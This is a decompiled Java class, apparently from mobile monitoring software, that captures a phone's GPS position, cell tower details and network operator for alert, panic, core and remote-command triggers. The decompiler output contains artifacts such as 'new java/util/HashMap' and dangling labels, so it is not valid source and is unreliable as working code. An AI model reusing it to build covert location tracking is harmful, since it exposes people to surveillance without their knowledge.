package com.vvt.capture.location;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.telephony.TelephonyManager;
import com.vvt.aj.b;
import com.vvt.base.FxEvent;
import com.vvt.events.FxAlertGpsEvent;
import com.vvt.events.FxLocationBase;
import com.vvt.events.FxLocationCallingModule;
import com.vvt.events.FxLocationEvent;
import com.vvt.events.FxLocationMapProvider;
import com.vvt.events.FxLocationMethod;
import com.vvt.events.FxPanicGpsEvent;
import com.vvt.location.LocationCaptureMode;
import com.vvt.location.LocationSource;
import com.vvt.location.j;
import com.vvt.location.k;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;

public class f
  implements a
{
  private static final String a = d.a(f.class.getSimpleName());
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.b;
  private HashMap d;
  private HashMap e;
  private HashMap f;
  private LocationManager g;
  private j h;
  private String i;
  private TelephonyManager j;
  private long k;
  
  public f(Context paramContext, String paramString)
  {
    this.i = paramString;
    Object localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.d = ((HashMap)localObject);
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.e = ((HashMap)localObject);
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.f = ((HashMap)localObject);
    localObject = new com/vvt/location/j;
    ((j)localObject).<init>();
    this.h = ((j)localObject);
    localObject = (LocationManager)paramContext.getSystemService("location");
    this.g = ((LocationManager)localObject);
    localObject = (TelephonyManager)paramContext.getSystemService("phone");
    this.j = ((TelephonyManager)localObject);
  }
  
  private FxEvent a(CallingModule paramCallingModule, Location paramLocation, LocationSource paramLocationSource)
  {
    Object localObject1 = CallingModule.ALERT;
    Object localObject2 = paramCallingModule;
    Object localObject3;
    boolean bool1;
    float f1;
    label39:
    long l1;
    double d1;
    double d2;
    label59:
    double d3;
    label74:
    double d4;
    label89:
    float f2;
    float f3;
    label104:
    boolean bool2;
    label126:
    int i1;
    int i2;
    int i3;
    Object localObject4;
    int i4;
    float f4;
    float f5;
    float f6;
    label203:
    Object localObject5;
    if (paramCallingModule == localObject1)
    {
      localObject1 = new com/vvt/events/FxAlertGpsEvent;
      ((FxAlertGpsEvent)localObject1).<init>();
      localObject3 = localObject1;
      if (paramLocation == null) {
        break label522;
      }
      bool1 = true;
      f1 = Float.MIN_VALUE;
      l1 = System.currentTimeMillis();
      if (!bool1) {
        break label534;
      }
      d1 = paramLocation.getLatitude();
      d2 = d1;
      if (!bool1) {
        break label544;
      }
      d1 = paramLocation.getLongitude();
      d3 = d1;
      if (!bool1) {
        break label554;
      }
      d1 = paramLocation.getAltitude();
      d4 = d1;
      if (!bool1) {
        break label564;
      }
      f2 = paramLocation.getSpeed();
      f3 = f2;
      if (!bool1) {
        break label579;
      }
      bool2 = paramLocation.hasBearing();
      if (!bool2) {
        break label579;
      }
      f2 = paramLocation.getBearing();
      localObject2 = this;
      i1 = k.a(this.j);
      i2 = k.b(this.j);
      i3 = k.d(this.j);
      localObject4 = this.j;
      i4 = k.c((TelephonyManager)localObject4);
      f4 = -1.0F;
      f5 = -1.0F;
      f6 = -1.0F;
      if (!bool1) {
        break label592;
      }
      bool1 = paramLocation.hasAccuracy();
      if (!bool1) {
        break label592;
      }
      f1 = paramLocation.getAccuracy();
      localObject4 = FxLocationMethod.CELL_INFO;
      localObject5 = LocationSource.GPS;
      localObject2 = paramLocationSource;
      if (paramLocationSource != localObject5) {
        break label603;
      }
      localObject4 = FxLocationMethod.INTERGRATED_GPS;
    }
    for (;;)
    {
      localObject2 = this;
      localObject5 = this.j.getNetworkOperatorName();
      if (localObject5 != null)
      {
        String str = ((String)localObject5).trim();
        int i5 = str.length();
        if (i5 != 0) {}
      }
      else
      {
        localObject5 = "unknown";
      }
      ((FxLocationBase)localObject3).setIsMockLocaion(false);
      ((FxLocationBase)localObject3).setEventTime(l1);
      ((FxLocationBase)localObject3).setLatitude(d2);
      ((FxLocationBase)localObject3).setLongitude(d3);
      ((FxLocationBase)localObject3).setAltitude(d4);
      ((FxLocationBase)localObject3).setSpeed(f3);
      ((FxLocationBase)localObject3).setSpeedAccuracy(f4);
      ((FxLocationBase)localObject3).setHeading(f2);
      ((FxLocationBase)localObject3).setHeadingAccuracy(f5);
      ((FxLocationBase)localObject3).setHorizontalAccuracy(f1);
      ((FxLocationBase)localObject3).setVerticalAccuracy(f6);
      ((FxLocationBase)localObject3).setMethod((FxLocationMethod)localObject4);
      localObject1 = FxLocationMapProvider.PROVIDER_GOOGLE;
      ((FxLocationBase)localObject3).setMapProvider((FxLocationMapProvider)localObject1);
      ((FxLocationBase)localObject3).setNetworkName((String)localObject5);
      localObject1 = String.valueOf(i4);
      ((FxLocationBase)localObject3).setNetworkId((String)localObject1);
      localObject2 = "unknown";
      ((FxLocationBase)localObject3).setCellName((String)localObject2);
      long l2 = i1;
      ((FxLocationBase)localObject3).setCellId(l2);
      localObject1 = String.valueOf(i3);
      ((FxLocationBase)localObject3).setMobileCountryCode((String)localObject1);
      l2 = i2;
      ((FxLocationBase)localObject3).setAreaCode(l2);
      return (FxEvent)localObject3;
      localObject1 = CallingModule.PANIC;
      if (paramCallingModule == localObject1)
      {
        localObject1 = new com/vvt/events/FxPanicGpsEvent;
        ((FxPanicGpsEvent)localObject1).<init>();
        localObject3 = localObject1;
        break;
      }
      localObject1 = new com/vvt/events/FxLocationEvent;
      ((FxLocationEvent)localObject1).<init>();
      Object localObject6 = CallingModule.CORE;
      if (paramCallingModule == localObject6)
      {
        localObject6 = FxLocationCallingModule.MODULE_CORE_TRIGGER;
        ((FxLocationBase)localObject1).setCallingModule((FxLocationCallingModule)localObject6);
        localObject3 = localObject1;
        break;
      }
      localObject6 = FxLocationCallingModule.MODULE_REMOTE_COMMAND;
      ((FxLocationBase)localObject1).setCallingModule((FxLocationCallingModule)localObject6);
      localObject3 = localObject1;
      break;
      label522:
      bool1 = false;
      f1 = 0.0F;
      localObject1 = null;
      break label39;
      label534:
      d1 = 0.0D;
      d2 = d1;
      break label59;
      label544:
      d1 = 0.0D;
      d3 = d1;
      break label74;
      label554:
      d1 = 0.0D;
      d4 = d1;
      break label89;
      label564:
      bool2 = false;
      f2 = 0.0F;
      localObject6 = null;
      f3 = 0.0F;
      break label104;
      label579:
      int n = 1140457472;
      f2 = 500.0F;
      break label126;
      label592:
      int m = -1082130432;
      f1 = -1.0F;
      break label203;
      label603:
      localObject5 = LocationSource.NETWORK;
      if (paramLocationSource == localObject5)
      {
        localObject4 = FxLocationMethod.AGPS;
      }
      else
      {
        localObject5 = LocationSource.CELLID;
        if (paramLocationSource == localObject5) {
          localObject4 = FxLocationMethod.NETWORK;
        }
      }
    }
  }
  
  private h a(CallingModule paramCallingModule, com.vvt.location.a parama)
  {
    boolean bool1 = b;
    if (bool1) {}
    synchronized (this.e)
    {
      Object localObject1 = this.e;
      bool1 = ((HashMap)localObject1).containsKey(paramCallingModule);
      boolean bool2;
      if (bool1)
      {
        localObject1 = this.e;
        localObject1 = ((HashMap)localObject1).get(paramCallingModule);
        localObject1 = (h)localObject1;
        bool2 = b;
        if (!bool2) {}
      }
      do
      {
        ((h)localObject1).a(paramCallingModule);
        boolean bool3 = b;
        if (bool3) {}
        return (h)localObject1;
        localObject1 = new com/vvt/capture/location/h;
        bool2 = false;
        HashMap localHashMap2 = null;
        ((h)localObject1).<init>(this, null);
        localHashMap2 = this.e;
        localHashMap2.put(paramCallingModule, localObject1);
        bool2 = b;
      } while (!bool2);
    }
  }
  
  private void a(CallingModule paramCallingModule, FxEvent paramFxEvent)
  {
    boolean bool1 = b;
    if (bool1) {}
    HashMap localHashMap = this.d;
    bool1 = false;
    Object localObject1 = null;
    for (;;)
    {
      try
      {
        Object localObject3 = this.d;
        boolean bool2 = ((HashMap)localObject3).containsKey(paramCallingModule);
        if (bool2)
        {
          localObject1 = this.d;
          localObject1 = ((HashMap)localObject1).get(paramCallingModule);
          localObject1 = (HashSet)localObject1;
        }
        if (localObject1 != null)
        {
          bool2 = ((HashSet)localObject1).isEmpty();
          if (!bool2) {}
        }
        else
        {
          bool1 = c;
          if (bool1) {}
          bool1 = b;
          if (bool1) {}
          return;
        }
        localObject3 = new java/util/ArrayList;
        ((ArrayList)localObject3).<init>();
        if (paramFxEvent != null) {
          ((ArrayList)localObject3).add(paramFxEvent);
        }
        Iterator localIterator = ((HashSet)localObject1).iterator();
        bool1 = localIterator.hasNext();
        if (bool1)
        {
          localObject1 = localIterator.next();
          localObject1 = (com.vvt.base.a)localObject1;
          boolean bool3 = c;
          if (bool3) {}
          ((com.vvt.base.a)localObject1).a((List)localObject3);
          continue;
        }
        bool1 = c;
      }
      finally {}
      if (!bool1) {}
    }
  }
  
  private void a(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = this.d.keySet();
    Iterator localIterator = ((Set)localObject1).iterator();
    bool1 = localIterator.hasNext();
    if (bool1)
    {
      localObject1 = (CallingModule)localIterator.next();
      Object localObject2 = this.d;
      localObject1 = (HashSet)((HashMap)localObject2).get(localObject1);
      boolean bool2 = b;
      if (bool2) {}
      localObject2 = ((HashSet)localObject1).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject2).hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = (com.vvt.base.a)((Iterator)localObject2).next();
        bool1 = b;
        if (!bool1) {}
      }
    }
  }
  
  private com.vvt.location.a c(CallingModule paramCallingModule)
  {
    LocationManager localLocationManager = null;
    boolean bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    bool2 = false;
    Object localObject1 = null;
    synchronized (this.f)
    {
      Object localObject3 = this.f;
      boolean bool3 = ((HashMap)localObject3).containsKey(paramCallingModule);
      boolean bool4;
      Object localObject4;
      long l3;
      long l4;
      if (!bool3)
      {
        bool4 = bool1;
        if (bool3)
        {
          localObject1 = this.f;
          localObject1 = ((HashMap)localObject1).get(paramCallingModule);
          localObject1 = (com.vvt.location.a)localObject1;
          bool3 = b;
          if (bool3) {}
          bool3 = b;
          if (bool3) {}
          ((com.vvt.location.a)localObject1).b();
          localObject4 = CallingModule.CORE;
          if (paramCallingModule == localObject4)
          {
            long l1 = ((com.vvt.location.a)localObject1).a();
            long l2 = this.k;
            bool3 = l1 < l2;
            if (bool3)
            {
              bool4 = b;
              if (bool4) {}
              bool4 = b;
              if (bool4) {}
              localObject3 = this.f;
              ((HashMap)localObject3).remove(paramCallingModule);
              bool4 = bool1;
            }
          }
        }
        if (bool4)
        {
          localObject1 = CallingModule.CORE;
          if (paramCallingModule != localObject1) {
            break label371;
          }
          l3 = this.k;
          l4 = l3;
          label200:
          l3 = 300000L;
          bool2 = l4 < l3;
          if (!bool2) {
            break label383;
          }
          bool2 = bool1;
        }
      }
      for (;;)
      {
        if (!bool2) {
          break label392;
        }
        localObject1 = LocationCaptureMode.TRACKING;
        localObject5 = localObject1;
        localObject1 = new com/vvt/location/a;
        Object localObject6 = this.j;
        localLocationManager = this.g;
        localObject3 = this.h;
        localObject4 = this.i;
        String str = paramCallingModule.toString();
        b localb = new com/vvt/aj/b;
        localb.<init>();
        ((com.vvt.location.a)localObject1).<init>((TelephonyManager)localObject6, localLocationManager, (j)localObject3, (String)localObject4, str, localb);
        ((com.vvt.location.a)localObject1).a((LocationCaptureMode)localObject5);
        ((com.vvt.location.a)localObject1).a(l4);
        long l5 = 180000L;
        l3 = 0L;
        ((com.vvt.location.a)localObject1).a(l5, l3);
        localObject6 = this.f;
        ((HashMap)localObject6).put(paramCallingModule, localObject1);
        bool1 = b;
        if (bool1) {}
        bool1 = b;
        if (bool1) {}
        return (com.vvt.location.a)localObject1;
        bool4 = false;
        localObject3 = null;
        break;
        label371:
        l3 = 60000L;
        l4 = l3;
        break label200;
        label383:
        bool2 = false;
        localObject1 = null;
      }
      label392:
      localObject1 = LocationCaptureMode.INTERVAL;
      Object localObject5 = localObject1;
    }
  }
  
  public void a(long paramLong)
  {
    this.k = paramLong;
  }
  
  public void a(CallingModule paramCallingModule)
  {
    boolean bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
    com.vvt.location.a locala = c(paramCallingModule);
    h localh = a(paramCallingModule, locala);
    locala.a(localh);
    bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
  }
  
  public void a(CallingModule paramCallingModule, com.vvt.base.a parama)
  {
    boolean bool = b;
    if (bool) {}
    bool = c;
    if (bool) {}
    synchronized (this.d)
    {
      Object localObject1 = this.d;
      bool = ((HashMap)localObject1).containsKey(paramCallingModule);
      if (bool)
      {
        localObject1 = this.d;
        localObject1 = ((HashMap)localObject1).get(paramCallingModule);
        localObject1 = (HashSet)localObject1;
        ((HashSet)localObject1).add(parama);
        localObject1 = "registerListener";
        a((String)localObject1);
        bool = b;
        if (bool) {}
        return;
      }
      localObject1 = new java/util/HashSet;
      ((HashSet)localObject1).<init>();
      ((HashSet)localObject1).add(parama);
      HashMap localHashMap2 = this.d;
      localHashMap2.put(paramCallingModule, localObject1);
    }
  }
  
  public boolean a()
  {
    return true;
  }
  
  public void b() {}
  
  public void b(CallingModule paramCallingModule)
  {
    boolean bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
    synchronized (this.f)
    {
      Object localObject1 = this.f;
      bool = ((HashMap)localObject1).containsKey(paramCallingModule);
      if (bool)
      {
        localObject1 = this.f;
        localObject1 = ((HashMap)localObject1).get(paramCallingModule);
        localObject1 = (com.vvt.location.a)localObject1;
        ((com.vvt.location.a)localObject1).b();
        bool = c;
        if (!bool) {}
      }
      do
      {
        bool = c;
        if (bool) {}
        return;
        bool = c;
      } while (!bool);
    }
  }
  
  public void b(CallingModule paramCallingModule, com.vvt.base.a parama)
  {
    boolean bool = b;
    if (bool) {}
    bool = c;
    if (bool) {}
    synchronized (this.d)
    {
      Object localObject1 = this.d;
      bool = ((HashMap)localObject1).containsKey(paramCallingModule);
      if (bool)
      {
        localObject1 = this.d;
        localObject1 = ((HashMap)localObject1).get(paramCallingModule);
        localObject1 = (HashSet)localObject1;
        ((HashSet)localObject1).remove(parama);
      }
      do
      {
        localObject1 = "unregisterListener";
        a((String)localObject1);
        bool = b;
        if (bool) {}
        return;
        bool = b;
      } while (!bool);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/location/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */